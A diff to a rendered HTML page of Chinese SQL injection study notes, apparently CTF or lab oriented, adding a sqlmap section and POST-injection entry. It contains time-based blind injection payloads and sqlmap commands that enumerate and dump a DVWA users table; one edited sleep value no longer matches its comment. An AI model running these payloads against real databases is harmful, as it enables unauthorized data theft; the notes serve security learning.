@@ -440,8 +440,22 @@
     延时注入
   </a>
   
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" title="sqlmap" class="md-nav__link">
+    sqlmap
+  </a>
+  
     <nav class="md-nav">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#post" title="post注入" class="md-nav__link">
+    post注入
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#cookie" title="cookie注入" class="md-nav__link">
@@ -2501,8 +2515,22 @@
     延时注入
   </a>
   
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap" title="sqlmap" class="md-nav__link">
+    sqlmap
+  </a>
+  
     <nav class="md-nav">
       <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#post" title="post注入" class="md-nav__link">
+    post注入
+  </a>
+  
+</li>
         
           <li class="md-nav__item">
   <a href="#cookie" title="cookie注入" class="md-nav__link">
@@ -2619,7 +2647,7 @@ concat(&quot;abc&quot;,0x22,&quot;123&quot;)=abc&quot;123
 
 
 <h3 id="_2">手工注入<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">));</span>
+<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">0</span><span class="p">));</span>
 <span class="c1">--长度为6 sleep 2秒，否则0秒。</span>
 
 <span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">150</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span>
@@ -2661,17 +2689,15 @@ concat(&quot;abc&quot;,0x22,&quot;123&quot;)=abc&quot;123
     <span class="k">print</span> <span class="s2">&quot;flag:&quot;</span><span class="p">,</span><span class="n">flag</span>
     <span class="k">break</span>
 <span class="k">print</span> <span class="s2">&quot;result:&quot;</span><span class="o">+</span><span class="n">flag</span>
+</pre></div>
 
-<span class="c1">### sqlmap  </span>
-
-<span class="sb">`-dbs -v 0  -dbs`</span><span class="p">,</span> <span class="err">根据不同的数据库管理平台探测包含的数据库名称</span>    
-<span class="sb">`-D dvwa --tables`</span> <span class="err">根据数据库</span><span class="n">dvwa查找表名</span>    
-<span class="sb">`-D dvwa --tables -T users --columns`</span> <span class="err">查找</span><span class="n">dvwa数据库中的users表中的字段列表</span>    
-<span class="sb">`-D dvwa --tables -T users --columns --dump `</span> <span class="err">字段内容</span>  
-
-<span class="c1">#### post注入</span>
-<span class="sb">``</span><span class="err">`</span><span class="n">bash</span>
-<span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">xxx</span><span class="o">.</span><span class="n">asp</span> <span class="o">--</span><span class="n">data</span><span class="s2">&quot;id=114&quot;</span> <span class="o">--</span><span class="n">level</span> <span class="mi">3</span>
+<h3 id="sqlmap">sqlmap<a class="headerlink" href="#sqlmap" title="Permanent link">&para;</a></h3>
+<p><code>-dbs -v 0  -dbs</code>, 根据不同的数据库管理平台探测包含的数据库名称  <br />
+<code>-D dvwa --tables</code> 根据数据库dvwa查找表名  <br />
+<code>-D dvwa --tables -T users --columns</code> 查找dvwa数据库中的users表中的字段列表  <br />
+<code>-D dvwa --tables -T users --columns --dump</code> 字段内容  </p>
+<h4 id="post">post注入<a class="headerlink" href="#post" title="Permanent link">&para;</a></h4>
+<div class="codehilite"><pre><span></span>sqlmap -u http://xxx.asp --data<span class="s2">&quot;id=114&quot;</span> --level <span class="m">3</span>
 </pre></div>
 
 <h4 id="cookie">cookie注入<a class="headerlink" href="#cookie" title="Permanent link">&para;</a></h4>
